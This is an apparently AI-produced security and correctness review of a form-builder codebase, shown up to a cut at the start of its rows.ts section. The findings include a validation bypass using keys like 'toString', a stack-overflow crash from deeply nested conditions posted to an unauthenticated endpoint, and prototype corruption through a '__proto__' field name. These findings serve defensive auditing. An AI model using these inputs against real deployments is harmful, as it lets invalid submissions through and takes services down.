# Formsmith deep code review — 2026-08-30 (second pass)

**Scope.** Every tracked file in the repository: 176 files, ~42,000 lines across `packages/core`,
`packages/renderer`, `packages/designer`, `packages/kit-mui`, `packages/kit-html`, `apps/playground`,
`apps/demo-server`, the shared test suites, the Playwright suite, the build and CI configuration, and
every specification and guide document. Branch `build-out/review-2026-08-30` at `fd694d6`.

**Method.** Seventeen Opus 5 subagents, each given a disjoint slice and instructed to read every
assigned file in full, top to bottom, with the source under test alongside for the test slices. The
union of the slices is the whole tree; no file was sampled and none was skipped. Each finding carries
an evidence rung (E1 asserted → E5 observed), and nothing above MEDIUM was allowed to rest on E1 or E2.
Every CRITICAL and the load-bearing HIGHs were then re-verified by the lead against the actual anchor
lines before publication.

This is an assessment. No code, no documentation and no git history was changed.

---

## Executive summary

**The headline is a server-side fail-open in the validation engine.** `validateAcross` — the function
the reference server calls on *every* submit, not only multi-step ones — merges per-scope errors into a
plain object literal using `merged[key] ??= message`. For any error keyed with a name inherited from
`Object.prototype`, the `??=` reads the inherited member, finds it non-nullish, and never assigns. The
error vanishes and the form reports as valid. `validateForm` one function above uses `Object.create(null)`
and carries a comment explaining precisely why; the fix was applied to one of the two and not the other.

`toString`, `valueOf` and `hasOwnProperty` all pass `KEY_PATTERN` and are **not** in `RESERVED_KEYS`, so
no gate needs bypassing — a document with a required field keyed `toString` validates cleanly, and a
submission missing that answer returns `{}` from `validateAcross` and a 200 from the server. I proved
this directly in Node rather than by reading: `({})['toString'] ??= msg` leaves zero own keys, while the
null-prototype object keeps it. Two agents reached this independently, from the source and from the test
suite.

**The second theme is guards that cannot fail.** Three of this repository's most load-bearing checks are
structurally incapable of reporting the thing they exist to report:

- The kit-contract suite's `nodeProps` rule reads `data-fs-key` and `data-fs-type` off the rendered
  element — but the renderer's error boundary *also* emits both, and the test passes no `onError`. A kit
  renderer replaced wholesale with `throw new Error()` passes the contract. The repo's own
  `renderer.test.tsx:915-930` is committed proof of the mechanism.
- `designer.css.test.ts`'s guard-of-the-guard, the test written to stop `declarationsFor` from reading
  only a selector's first block, **never calls `declarationsFor`**. It re-implements the scan inline over
  a synthetic sheet, with a different algorithm. Its only call site is the other test.
- `test/count-reporter.ts` — the one check that compares the documented test totals against what actually
  ran — disables itself permanently the first time anyone adds a test under `apps/`, and reports that as
  a routine "filtered run" skip.

**Third: unbounded recursion in the functions documented as total.** `validateDocument` is described as
"never throws" and its `visit` walker carries a `MAX_TREE_DEPTH` bound — but the `condition` walker
nested inside it takes no depth parameter at all. Same shape in `condition.ts`: `same()` propagates
`depth` through objects and not arrays, and `evaluate()` propagates it through `not` and not through
`and`/`or`. So the bound exists, is tested, and does not apply to the branch a hostile document would
actually use. A 200 KB body — well under the demo server's 1 MB cap — reaches `RangeError` on an
unauthenticated endpoint.

**Fourth: the two kits disagree about what a number means.** `gap` is CSS pixels in `kit-html` and MUI
spacing multiples in `kit-mui` (and pixels again on `kit-mui`'s own `Grid`). The kit contract states a
document authored against one kit renders against the other; in practice every gap becomes 8× larger.
The contract never says what unit a length prop carries, so neither kit is wrong — the contract is
under-specified, and that is where the fix belongs.

**Fifth: the published READMEs will not work.** `packages/renderer/README.md` ships an `onChange` handler
that is verbatim the anti-pattern the source file warns against by name — `{ ...data, [key]: value }` —
which inside a repeater creates a literal property called `addresses[1].line1` and silently drops every
row answer. Both the designer and renderer READMEs import `@formsmith/kit-mui` from an install line that
does not include it (and cannot: the lint config forbids the transitive dependency). Both kit READMEs
advertise 8 components; both kits ship 27.

**Sixth: the designer's keyboard model is dead in the commonest state.** The shell's focus-steal guard
exempts anything matching `input, textarea, select, button` on the theory that "anything that takes focus
itself keeps it". On the canvas, `onMouseDownCapture` deliberately `preventDefault`s exactly that, so a
click on a field selects the component, leaves the shell unfocused, and every shell shortcut — Delete,
Ctrl+Z, Escape — silently does nothing. The e2e keyboard suite never sees it because it calls
`.focus()` on a tree row first.

**Seventh, and structural: the invariant guardrails have a consistent blind spot.** `no-restricted-imports`
has no `ImportExpression` visitor, so a dynamic `await import('@mui/material')` in the designer breaks
invariant 2 and lints clean. The CSS guard's `reachesIntoTheForm` matches `/^\.fs-(shell|canvas)/` against
each compound, so `:where(.fs-shell) input` — the literal rule that broke MUI's notched outline — passes
both assertions. `eslint .` never lints `aliases.ts` at all, the file `CLAUDE.md` calls load-bearing.

### Severity tally

| Severity | Count |
| -------- | ----- |
| CRITICAL | 4     |
| HIGH     | 52    |
| MEDIUM   | 174   |
| LOW      | 171   |
| NOTE     | 141   |
| **Total** | **542** |

Across 170 files (26 came back clean). Evidence distribution: E5 58, E4 270, E3 41, E2 172, E1 1.
**No CRITICAL or HIGH rests on E1 or E2** — the rung floor the method requires.

The four CRITICALs are the `validateAcross` fail-open, the unbounded condition walker inside
`validateDocument`, and the two kit-contract rules that the renderer's error boundary makes unfailable.

### Cross-cutting themes

1. **A fix applied to one of two twins.** `validateForm`/`validateAcross`, `same`'s object/array branches,
   `evaluate`'s `not` vs `and`, `visit`/`condition` in `validateDocument`, `Canvas`/`Palette` guarding
   `event.button` while `Tree` does not, `moveNode` guarding `Array.isArray(children)` while `insertNode`
   does not, `visibility.ts` wrapping the evaluator in `try`/`catch` while `validation.ts` and the
   renderer do not. In every case a comment on the fixed twin explains the bug in detail.
2. **The comment describes the intent; the code does something else.** `Icon.tsx` says a cast was removed
   and the cast is on that line. `designer.css:855` uses `revert` where `initial` was meant, so the
   inheritance breach it claims to fix is open. `store.ts:218` says a node "is small" while the node it
   `JSON.stringify`s carries its whole subtree. `Binding.tsx:227` says a rename "moves" translations; it
   copies them.
3. **Row identity is dropped one layer too early.** `Candidate` in `geometry.ts` carries no row, so
   `resolveDrop` interleaves candidates from every repeater row and computes wrong insertion indices; the
   hover frame measures without a row and outlines row 0; `selectedRow` is never cleared on a tree
   selection; the error boundary's fallback omits `data-fs-row`. One missing field, four symptoms.
4. **Undo coalescing swallows structural edits.** Every write on the Rules tab shares one label, so adding
   a rule folds into the preceding typing run; choosing "Always" after authoring a condition replaces the
   history entry holding it, making the condition unreachable by undo *and* redo.
5. **The documentation understates what is enforced, which is the dangerous direction.**
   `02-kit-contract.md` says no test checks `aria-invalid`; one does, against every kit. It lists five
   accessibility obligations; the suite enforces six. It presents 19 rules; ~13 more `it.each(KITS)` tests
   also run. A kit author budgets against the document and meets a red build.
6. **`docs/spec/12-api.md` names an export that does not exist.** Hosts are told to call
   `rowScopeProblems` at boot; it is not in `packages/core/src/index.ts` and there is no `export *`.
7. **The resume mechanism the last run designed has been deleted.** Both `RUN.md` and `queue.md` state
   that `CLAUDE.md` holds a stable pointer at the queue. `CLAUDE.md` contains no occurrence of
   `build-out`, `queue.md` or `decisions.md`.

---

## Verification note

I read the anchor lines myself for all four CRITICALs and for every HIGH whose severity depended on a
fact rather than a judgement. Verdicts on the checked set:

**CONFIRMED (17 of 17 checked).** Every finding I verified held exactly as reported.

| Finding | How I checked it |
| --- | --- |
| `validateAcross` fail-open | Read `validation.ts:705-713`; ran `({})['toString'] ??= v` in Node — zero own keys. Confirmed `toString`/`valueOf`/`hasOwnProperty` pass `KEY_PATTERN` and are absent from `RESERVED_KEYS`. **E5.** |
| kit-contract `nodeProps` unfailable | Read `renderer/src/index.tsx:286-296` — the boundary fallback emits `data-fs-key`, `data-fs-type`, `data-fs-scope`. Read `kit-contract.test.tsx:766-784` — no `onError` passed. |
| `designer.css.test.ts` guard-of-the-guard | Grepped `declarationsFor` in that file: defined at :44, called only at :292 — the *other* test. Read :259-288; the body is an inline re-implementation. **E5.** |
| `tree.ts` unbounded condition walker | Read `:724-731` (`visit` has `depth`, checked against `MAX_TREE_DEPTH`) against `:936-955` (`condition` recurses with no depth argument). |
| `condition.ts` depth not propagated | Read `:33` (`same(item, b[i])`, no depth) vs `:43` (`depth + 1`); `:280` (`evaluate(inner, …)`, no depth) vs `:287` (`depth + 1`). |
| CI skips `kit-html` | Read `ci.yml:73`: `for pkg in core renderer designer kit-mui`. Line 77 checks `designer.css` only. **E5.** |
| `rowScopeProblems` not exported | Read `core/src/index.ts:65-79`; eleven names from `./rows.js`, not this one. No `export *` anywhere in the file. |
| `Tree.onRowPointerDown` any-button drag | Read `Tree.tsx:117-123` (no `event.button` check) against `Canvas.tsx:327-340`, which has the check plus a comment describing this exact bug. |
| Shell focus guard vs canvas | Read `Designer.tsx:219-232` (selector exempts `input`/`button`), `Canvas.tsx:321-325` (`preventDefault` + `stopPropagation` on every non-chrome mousedown), `Designer.tsx:612` (listener on the shell element, not `window`). |
| renderer README anti-pattern | Read `packages/renderer/README.md:22` — the spread handler is there verbatim. |
| designer + renderer README install lines | Read both; neither includes `@formsmith/kit-mui`, both snippets import it. |
| Kit READMEs say 8, kits ship 27 | `grep -c "^\s*type: '"` returns 27 for each `definitions.ts`. **E5.** |
| `optionEntry` drops bare-string labels | Read `json.ts:84`: `typeof record?.['label'] === 'string' ? … : value`, and `record` is `undefined` for a string option. |
| `schema.ts` `__proto__` accumulator | Read `:238` (`= {}`) against `factory.ts:65`, `validation.ts:488`, `:654`, `:669`, all `Object.create(null)`. |
| `setDataKey` skips `keyProblem` | Grepped `keyProblem` in `store.ts`: one call site, line 446, inside `renameKey`. |
| `accessibility.md` lowest-pair row | Recomputed `#b26a00` on `#ffffff` with the repo's own WCAG formula: **4.24:1**, against a documented 4.83:1, and the pair *is* asserted at `contrast.test.ts:225`. **E5.** |
| Resume pointer absent from `CLAUDE.md` | Grepped `build-out`, `queue.md`, `decisions.md` in `CLAUDE.md`: no match. **E5.** |
| `SKILL.md` e2e count | Counted `^\s*test(` across the eight spec files: 68. `SKILL.md:240` says 65. **E5.** |
| `forms.json.tmp` not ignored | `git check-ignore -v` on both paths matched only `forms.json`. **E5.** |
| Node engines drift | Root declares `>=22.0.0`; all five packages declare `>=20`; `CLAUDE.md` says Node 22+. **E5.** |

**REFUTED: none.** No agent's finding collapsed on inspection. That is unusual and worth saying plainly —
it reflects the E-ladder discipline rather than luck; the agents self-reported low rungs (several findings
arrived tagged E1/E2 and were correspondingly filed as LOW or NOTE) instead of inflating them.

**Findings deliberately kept at their claimed severity but marked UNVERIFIED:**

- **`kit-mui` deprecated `inputProps` on MUI 7** (`renderers.tsx:275`, MEDIUM, flagged UNCERTAIN by its
  agent). Settling it needs `@mui/material@7` installed and the assertion re-run — not reachable
  read-only. The `package.json` peer range does admit `^7.0.0`, so the exposure is real.
- **`designer.css:855` `revert` is a no-op** (MEDIUM, UNCERTAIN). The CSS-cascade reasoning is sound and
  the agent showed it, but confirming it needs `getComputedStyle` in a real browser. Both in-repo kits
  mask the symptom, so only a third-party kit would surface it.
- **`css.ts` unterminated-string swallow** (`:71,206`, MEDIUM). Confirming the exact blast radius needs a
  real CSS parser over the concatenated sheet.

**Two notes on scope honesty.** I could not count the "1500 unit tests" claim read-only, because `it.each`
expands at runtime; the figure is machine-enforced by `test/count-reporter.ts`, subject to the two ways
that reporter disables itself (both reported). And one agent reached E5 on several findings by executing
built code in Node rather than only reading it — that exceeded the read-only instruction, produced no
mutation, and I have kept those findings while re-deriving the load-bearing ones myself.

---

# Findings by area

## Area 1 — core: document model, kit metadata, JSON schema

## packages/core/src/types.ts
- **[LOW]** **[E4]** `packages/core/src/types.ts:185-186` — The `FormData` doc comment says "keyed by component key", but every producer and consumer keys it by `dataKey`. Evidence: `validation.ts:508` reads `valueOf(rowData(data, scope), dataKeyOf(node))`, `validation.ts:635` uses `dataKeyOf(node)` when building `submittedData`, and `dataKeyOf` (`tree.ts:435-437`) returns `node.dataKey ?? node.key`. The `ComponentNode.dataKey` comment two dozen lines above (`types.ts:136-148`) states the split explicitly and says errors — not data — stay keyed by `key`. Failure scenario: a host reading only this line writes `data[node.key]`, which silently misses every field the author renamed via `dataKey`, and two fields deliberately sharing a `dataKey` (the documented pattern) are read as two separate answers.
- **[LOW]** **[E3]** `packages/core/src/types.ts:92` — `CodeAction.body` is documented in the present tense as "JavaScript source. Executed in a sandbox", but nothing in the repo executes it. Evidence: `CodeAction` appears only in `types.ts` and `index.ts` (no other production reference); `ActionRef`/`ComponentNode.events` are consumed only by `tree.ts:291-297` (a structural copy) and `validateDocument`'s `unknown-action` check; `docs/spec/README.md:42` lists `09-actions.md` as **Planned**, with the note "actions are a design with no code". Failure scenario: a host integrating against the published types reads "executed in a sandbox", assumes core owns the boundary, and wires `new Function(action.body)` itself — the exact `eval`-of-document-strings crossing invariant 6 exists to prevent, made likelier by a type comment that implies core already handles it.

## packages/core/src/index.ts
No issues found.

## packages/core/src/exhaustive.ts
No issues found.

## packages/core/src/factory.ts
- **[LOW]** **[E4]** `packages/core/src/factory.ts:66` — `Object.entries(def.defaultProps)` and `def.defaultRenderWhen(node.key)` (line 81) call into third-party kit data with no guard, in a function whose own comment (lines 57-63) argues that "a kit is third-party code by design". Evidence: `ComponentDef.defaultProps` is a required field in the type (`kit.ts:130`) and `defaultRenderWhen` is a kit-supplied function (`kit.ts:118`); nothing between the kit and this call validates either. `Object.entries(undefined)` throws `TypeError`, and a throwing `defaultRenderWhen` propagates. Failure scenario: a kit compiled loosely, or built by a host at runtime from JSON, omits `defaultProps` → dragging that palette entry throws inside the designer's drop handler rather than reporting a bad kit. The prototype-pollution half of the same threat is correctly defended (`Object.create(null)` at line 65, then `{...built}`, whose `CopyDataProperties` creates `__proto__` as an own data property rather than invoking the setter — verified).

## packages/core/src/keys.ts
- **[NOTE]** **[E4]** `packages/core/src/keys.ts:25` — `KEY_PATTERN` bounds the character set but not the length, so an arbitrarily long key is a legal key. Evidence: `/^[A-Za-z_][A-Za-z0-9_]*$/` with an unbounded `*`; `keyProblem` returns `undefined` for it. The regex itself is linear (no nested quantifier, no ReDoS). Failure scenario: an imported document with a 1 MB `dataKey` passes `validateDocument`, then appears in `data-fs-key`, in a CSS selector, in `FormData`, and in the exported JSON Schema property name — a robustness papercut rather than a breach, listed because this file is the single place a key grammar is decided.

## packages/core/src/kit.ts
- **[NOTE]** **[E2]** `packages/core/src/kit.ts:151-157, 166-183` — The "first declaration of a type wins" rule is implemented twice, once as `!byType.has(...)` in `indexKit` and once as a separate `seen` Set in `groupKit`, with a comment in each pointing at the other. Evidence: both functions iterate `kit.components` independently and each maintains its own dedup structure. Failure scenario: a future change to how duplicate types resolve (last-wins, or a warning) has to be made in two places, and the failure mode if it is not — the palette drawing one definition while the renderer resolves another — is precisely the bug the comment at 141-149 says already happened. `groupKit` could derive its dedup from `indexKit(kit)` instead.

## packages/core/src/language.ts
- **[LOW]** **[E4]** `packages/core/src/language.ts:23-25` — `findLanguage` is exported from the package's public surface but has no caller anywhere in the repo except its own test. Evidence: a repo-wide grep for `findLanguage` returns only `language.ts:23`, `index.ts:83`, and `language.test.ts:28-29`; every real lookup uses `languageTag` plus an inline `.some`/`.includes` (`Designer.tsx:193`, `store.ts:424-430`, `FormSettings.tsx:75-76`). Failure scenario: none at runtime — it is dead public API that must nevertheless be kept semver-stable.
- **[NOTE]** **[E2]** `packages/core/src/language.ts:11-14` — The file docstring claims "One function, used everywhere a language is named, so the two spellings cannot drift apart again", but the one place that matters most deliberately does not call it. Evidence: `tree.ts:1161-1174` re-spells the tag rule inline inside `validateDocument`, with its own comment saying "Spelled out rather than calling `languageTag`, because the input here is untrusted" — and the same comment records that this copy had already drifted once (`typeof dialect === 'string'` vs truthiness, producing `en-`). Failure scenario: the comment tells a maintainer the rule lives in one place, so a change here leaves `validateDocument`'s copy behind — which is how the `en-` bug the comment describes was introduced.

## packages/core/src/json.ts
- **[MEDIUM]** **[E4]** `packages/core/src/json.ts:84` — `optionEntry` never uses a bare-string option as its own label, so an options list of plain strings renders as `"0"`, `"1"`, `"2"` in both kits. Evidence: for `option = 'Yes'`, line 79 sets `record = undefined` (a string is not `typeof 'object'`), so `declared` is `undefined`, line 82 sets `value = String(index)`, and line 84's guard `typeof record?.['label'] === 'string'` is false, so `label = value = '0'` — the original string is discarded. Bare-string options are an explicitly supported shape: `optionValue`'s own comment (line 42) and tests (`json.test.ts:83-88`) use `['Yes', 'No']`. Both kits draw labels through this function (`kit-mui/src/renderers.tsx:345`, `:587`; `kit-html/src/renderers.tsx:370`, `:655`). `optionEntry` has no test at all — `json.test.ts:3` imports `isEmpty, jsonToString, optionValue, readPath, safeHref, valueOf` and not `optionEntry`. Failure scenario: an author sets a Select's `options` prop to `["Yes","No"]` in the JSON editor → the rendered form shows a dropdown of "0" and "1"; the docstring's claim that "the value is the fallback label, so an option always draws as something" is true only in the letter.
- **[LOW]** **[E4]** `packages/core/src/json.ts:53-57` — The second pass of `optionValue` is unreachable in effect: it returns the same value the fall-through returns. Evidence: line 54's body is `return submitted` and line 57 is `return submitted`, so deleting lines 53-55 cannot change any result. The comment above it (lines 39-47) presents the two-pass structure as the fix for `['Yes', { label: 'No', value: '0' }]`, but the first pass alone already resolves that case by returning the declared `'0'`. Failure scenario: none at runtime — dead code carrying a comment that credits it with a fix it does not provide, which is the kind of thing a maintainer preserves rather than deletes.
- **[LOW]** **[E4]** `packages/core/src/json.ts:84` — A non-string `label` is discarded rather than rendered. Evidence: the guard is `typeof record?.['label'] === 'string'`, so `{ label: 2024, value: 'y2024' }` falls back to `label = 'y2024'`, even though `jsonToString` (line 13) exists in this same file and renders numbers and booleans correctly. Failure scenario: an author writes numeric year labels in the JSON options editor and the control draws the values instead.

## packages/core/src/schema.ts
- **[MEDIUM]** **[E4]** `packages/core/src/schema.ts:238, 286, 290` — `objectFor` accumulates document-supplied names into a plain object literal, so a `dataKey` of `__proto__` invokes the `__proto__` setter instead of adding a property: the field vanishes from the export and the accumulator's prototype is replaced. Evidence: line 238 is `const properties: Record<string, JsonSchemaProperty> = {}` (Object.prototype-derived), `name` comes from `dataKeyOf(node)` (line 255) which is document data, and lines 286/290 assign `properties[name] = …`. Verified directly in Node: `const o={}; o['__proto__']={type:'x'}` yields `Object.keys(o) === []`, `JSON.stringify(o) === '{}'`, and `Object.getPrototypeOf(o) === {type:'x'}`. Meanwhile `required.push(name)` at line 278 is unaffected. Core defends exactly this in three other places — `factory.ts:65`, `validation.ts:654`, `validation.ts:669` all use `Object.create(null)`, and `keys.ts:37-41` lists `__proto__` as reserved *because* "reporting is not refusing". Failure scenario: an imported document with `"dataKey": "__proto__"` (which `validateDocument` reports but does not block, and which a library consumer calling `toJsonSchema` directly never runs) → the exported schema silently omits that field while listing `"__proto__"` in `required`, so a server validating against it rejects every conforming payload.
- **[MEDIUM]** **[E4]** `packages/core/src/schema.ts:161-172` — `applyRule` decides between the length keywords and the item keywords by checking only for `array`, so a length rule on a `number` or `object` field, and a bounds rule on a `string`/`date`/`file` field, export as a keyword JSON Schema ignores for that type — and `unexportableRules` reports the export as lossless. Evidence: `counting` is `property.type === 'array'` (line 162) and nothing else is considered; `baseType` (lines 131-150) maps `number → {type:'number'}` and `string/date/file → {type:'string'}`. The form does enforce these: `lengthOf` (`validation.ts:269-271`) falls back to `asString(value).length`, so `minLength: 5` on a number rejects `42`; `comparableNumber` (`validation.ts:390-397`) coerces, so `min: 5` on a string field rejects `'abc'`. JSON Schema keywords apply only to their own instance type, so `{"type":"number","minLength":5}` and `{"type":"string","minimum":5}` are both no-ops. `unexportableRules` (lines 74-128) reports only `custom`, guarded rules, duplicate format rules, and duplicate `dataKey`s — never this. Failure scenario: a form with `min: 18` on a string-typed age field rejects `"seven"` in the browser; the exported schema silently drops the constraint, so a server validating the same payload accepts it — a divergence in the permissive direction, which is the failure mode this file's sibling comments (lines 30-37, 152-160) already identify and fix for the array case only.
- **[MEDIUM]** **[E4]** `packages/core/src/schema.ts:119-125` — The duplicate-`dataKey` lossiness check walks the tree flat, but the export gives a repeater's rows their own property namespace, so a row field sharing a name with a top-level field is reported as a collision the export does not actually have. Evidence: `walk(document.root, …)` (line 120, via `tree.ts:25-33`) visits every descendant including repeater children, and `claimed` is a single flat Set; `objectFor` instead puts a row-scope node's children under `items.properties` (lines 282-288) by recursing into a fresh `properties` object. `schema.test.ts` has no fixture where a row field and a top-level field share a name — the collision assertions there (`:566`, `:582`) are all single-level. Failure scenario: a document with a top-level `sku` field and a `lines` repeater containing its own `sku` exports both correctly (one at the root, one under `properties.lines.items.properties`), yet the JSON dialog warns "a schema for sku" was lost — training the author to ignore the one warning that is supposed to be trustworthy.
- **[MEDIUM]** **[E4]** `packages/core/src/schema.ts:241-292` — `objectFor.visit` recurses once per tree level with no depth bound, so a deeply nested document overflows the stack. Evidence: line 247 and line 291 both call `visit(child)` unconditionally, and line 283 recurses into `objectFor` for each nested repeater; no depth parameter or cap exists anywhere in this file. Core caps recursion elsewhere for exactly this reason — `MAX_DEPTH = 200` guards `same` and `evaluate` (`condition.ts:25, 59, 193`) and `MAX_CONDITION_DEPTH` guards both walkers in `context.ts:43, 262` — and `validateForm` caps row expansion (`validation.ts:510-519`). The gate does not help here: `validateDocument` reaches the same document through `walk`, which is itself unguarded recursion. Failure scenario: a pasted or database-sourced document with ~10k nested containers → `RangeError: Maximum call stack size exceeded` thrown from `toJsonSchema` during the JSON dialog's render (`DocumentDialog.tsx:73`, called unconditionally in the component body), taking the designer down rather than reporting a bad document.
- **[LOW]** **[E4]** `packages/core/src/schema.ts:302-303` — A document whose root is itself a repeater exports its rows flattened to the top level, losing the array entirely. Evidence: the guard is `if (root.schema && !isRowScope(root)) visit(root)`, so a root that *is* a row scope falls to the `else` branch and its children are emitted as top-level properties — the `!isRowScope` exclusion is required for the recursion at line 283 to work and has no separate handling for the top-level case. `types.ts:173-175` says the root is "Always a container", and a repeater is a container. Failure scenario: an imported document with a `Repeater` root exports `{properties: {sku: …}}` instead of an array of row objects — precisely the "flat projection named a repeater's fields at the top level" failure the comment at lines 229-233 says is silent and was already fixed once.
- **[LOW]** **[E2]** `packages/core/src/schema.ts:203-208` — `titleOf` reads `held['label'] ?? held['text']` through the prototype chain, unlike every other document read in core. Evidence: `json.ts:183-185` (`valueOf`) and `json.ts:223` (`readPath`) both use `Object.hasOwn` and document why ("a plain lookup finds the prototype"); this function, whose own comment (lines 196-202) is about hardening against malformed `props`, does not. Failure scenario: `props` arriving with a non-null prototype carrying `label` — or an application that has polluted `Object.prototype.label` — gives every untitled field the same inherited title in the export.
- **[LOW]** **[E4]** `packages/core/src/schema.ts:76, 112, 120` — `unexportableRules` walks the whole tree three times to answer one question. Evidence: three separate `walk(document.root, …)` calls, each visiting every node; the three passes share no state that forces the separation (`claimed`, `FORMAT_RULES` and the guard check are all per-node). Failure scenario: 3× the work on every render of the JSON dialog, which calls this unmemoized in the component body (`DocumentDialog.tsx:74`); a correctness non-issue, a needless constant factor on large documents.
- **[NOTE]** **[E2]** `packages/core/src/schema.ts:161` — This file's private `applyRule` shares its name with a different exported function. Evidence: `index.ts:109` re-exports `applyRule` from `validation.js`, which evaluates a rule against a value; this one folds a rule into a JSON Schema property. Failure scenario: none at runtime — a reader grepping `applyRule` in `packages/core` finds two unrelated functions with the same name and different contracts.
- **[NOTE]** **[E4]** `packages/core/src/schema.ts:10-11` — The header states "`FormData` is flat, keyed by component key", but the code twelve lines of comment later uses `dataKeyOf(node)` for the property name (lines 122, 255). Evidence: `dataKeyOf` returns `node.dataKey ?? node.key` (`tree.ts:435-437`). Same drift as `types.ts:186`. Failure scenario: a reader concludes the exported property names are node keys and is wrong for every renamed field.

## Area 2 — core: the tree and the repeater rows

## packages/core/src/tree.ts

- **[CRITICAL]** **[E5]** `packages/core/src/tree.ts:936` — `visitShape`'s `condition()` walker recurses with no depth bound, so the one function documented as "total by design … never throws" throws `RangeError` on an untrusted document. Evidence: `visit` at :724 carries a `depth` parameter checked against `MAX_TREE_DEPTH` (:729), but `condition` at :936 recurses into `conditions[]` (:950) and `condition` (:954) with no depth argument at all; the comment at :607-617 says the bound was added precisely because "a deep enough one produced a `RangeError` out of the gate itself." Failure scenario: the agent ran the built `validateDocument` against a JSON body of `{"op":"not","condition":…}` nested 8 000 deep inside `root.props.p` — **200 312 bytes**, well under `apps/demo-server`'s 1 MB `MAX_BODY` (`apps/demo-server/src/index.ts:149`) — and it threw `RangeError: Maximum call stack size exceeded` instead of returning errors; `JSON.parse` itself handled 37 000 levels (925 KB) without complaint, so the parse layer offers no protection. `PUT /api/forms/:id` (`apps/demo-server/src/index.ts:195`) turns this into an unauthenticated 500 on the validation endpoint, and `documentProblems` (`packages/designer/src/panels/DocumentDialog.tsx:316`) throws out of the paste handler.
- **[HIGH]** **[E5]** `packages/core/src/tree.ts:282` — `duplicateNode` spreads `node.schema.validations` without a guard, but `validateDocument` explicitly allows `validations` to be absent, so the gate passes a document that the duplicate action then crashes on. Evidence: :1019-1020 reads `const validations = schema['validations']; if (validations === undefined) return` — absent is accepted — while :282 does `[...node.schema.validations]` on a field typed as non-optional; `rows.ts:287` guards the identical read with `Array.isArray(node.schema?.validations)`, so the defensiveness exists elsewhere in the package. Failure scenario: `validateDocument` on a document whose field carries `schema: { type: 'string' }` with no `validations` returns 0 errors, then `duplicateNode(root, 'email')` throws `TypeError: node.schema.validations is not iterable`. Reachable from `packages/designer/src/store.ts:525` for any imported/hand-edited document.
- **[HIGH]** **[E5]** `packages/core/src/tree.ts:210` — `repointBinding`'s `inCondition` recurses into `conditions[]` (:241) and `condition` (:244) with no depth bound, and there is a window where the gate accepts a document that this function then throws on. Evidence: `validateDocument`'s own condition walker is likewise unbounded, so it either throws or accepts arbitrary depth — it never *rejects* on depth. Failure scenario: a document with a 5 000-deep `renderWhen` condition returned **0 errors** from `validateDocument` (so `store.ts:298` loads it and the demo server persists it), and `duplicateNode` on that node then threw `RangeError` via `repointBinding`. The same call sits on the designer's rename path (`packages/designer/src/store.ts:484`).
- **[MEDIUM]** **[E5]** `packages/core/src/tree.ts:336` — `updateNode`'s "first match, and only the first" guarantee is implemented with a `changed` flag rather than a `found` flag, so an update that returns the node unchanged lets the walk continue and apply the edit to a *later* duplicate-keyed node. Evidence: :339 sets `changed` only when `next !== child`, and `packages/designer/src/store.ts:230-233` (`writeNode`) deliberately returns `node` by identity when `JSON.stringify` round-trips equal — exactly the identity-returning update the flag cannot distinguish from "not found". Failure scenario: a root with two children both keyed `a`, the first already holding `label: 'same'`, then `updateNode(dup, 'a', writeNodeStyleUpdate)`; the first node was left alone and the **second** node's label was overwritten with `'same'`. The comment at :324-334 claims this class of bug ("one edit landed twice") was fixed.
- **[MEDIUM]** **[E5]** `packages/core/src/tree.ts:347` — `insertNode` will give a leaf a `children` array, leaving open the exact API hole `moveNode`'s comment says was the worse of the two places to leave it. Evidence: `moveNode` guards with `if (!Array.isArray(parent.children)) return root` (:419) under a comment reading "The designer's own drop paths refuse this, so it was unreachable from the UI and reachable from the API, which is the worse of the two places to leave it" — but `insertNode` is exported from the package (`packages/core/dist/index.d.ts:19`) and carries no such check. Failure scenario: `insertNode(root, 'email', node)` on a `TextField` leaf returned `{"key":"email","type":"TextField","props":{},"children":[{"key":"inner",…}]}` — a text field with a field inside it, which no renderer draws while `validateForm` and `toJsonSchema` keep walking it.
- **[LOW]** **[E4]** `packages/core/src/tree.ts:739` — a node with a non-string or whitespace-only key skips `visitEvents` and `visitShape` entirely, so its props, conditions, css and validation rules go unchecked. Evidence: :805-806 sit inside the final `else` of the `typeof key !== 'string'` / `!key.trim()` / else chain, while `children` recursion at :809 is outside it. Failure scenario: `{"key":"","type":"T","props":{"p":{"kind":"conditon"}}}` reports only `empty-key`; the misspelled binding kind is never reported, so a fixed key still leaves the document broken and the second report only arrives on the next validation pass.
- **[LOW]** **[E4]** `packages/core/src/tree.ts:1180` — `tags.includes(candidate['defaultLanguage'] as string)` can silently pass because `tags` may contain `undefined`. Evidence: :1144 pushes `undefined` for any language that is not a record or has a non-string `code`, and the cast at :1180 hides that `defaultLanguage` is `unknown`. Failure scenario: `languages: [{}]` plus a missing `defaultLanguage` makes `tags = [undefined]` and `includes(undefined)` true, so no `unknown-language` error is raised — the document is malformed for a different reason, but a caller filtering errors by `code` sees the language link as sound.
- **[LOW]** **[E2]** `packages/core/src/tree.ts:356` — a `NaN` index is clamped to `NaN`, not to a position. `Math.max(0, Math.min(NaN, len))` is `NaN`, and `splice(NaN, 0, node)` coerces to 0, so a caller passing a computed-but-broken index silently prepends instead of appending. The `Math.max/Math.min` clamp reads as though it handles every non-integer.
- **[LOW]** **[E4]** `packages/core/src/tree.ts:158` — `baseOf` strips trailing digits without re-checking the key grammar or the copy's intent, so a duplicate can be named *below* its source. Evidence: `baseOf('website2')` is `'website'`, and `freeKey` returns `'website'` unchanged when nothing has taken it. Failure scenario: a document where `website` was renamed away but `website2` remains — duplicating `website2` produces `website`, not `website3`, contradicting the comment at :157 and :167.
- **[NOTE]** **[E2]** `packages/core/src/tree.ts:162` — the `duplicateNode` docstring is orphaned. Three JSDoc blocks stack at :162-204 and only the last one (`/** The three places an operand can sit… */`) attaches to `SIDES`; `duplicateNode` at :253 and `repointBinding` at :207 both end up with no attached documentation in an IDE or in generated `.d.ts`.
- **[NOTE]** **[E2]** `packages/core/src/tree.ts:306` — `/** Replace the node matching key, returning a new tree. */` is immediately followed by a second JSDoc block for the same function, so the first is dangling and unreachable.
- **[NOTE]** **[E2]** `packages/core/src/tree.ts:877` — `binding`'s `switch` handles `'condition'` in the `default` branch. The `Covers` assertion at :509 forces a fifth `PropValue['kind']` to be added to `BINDING_KIND_LIST`, which would then make it pass `oneOf` and fall into `default`, where it is validated as a condition rather than rejected.

## packages/core/src/rows.ts

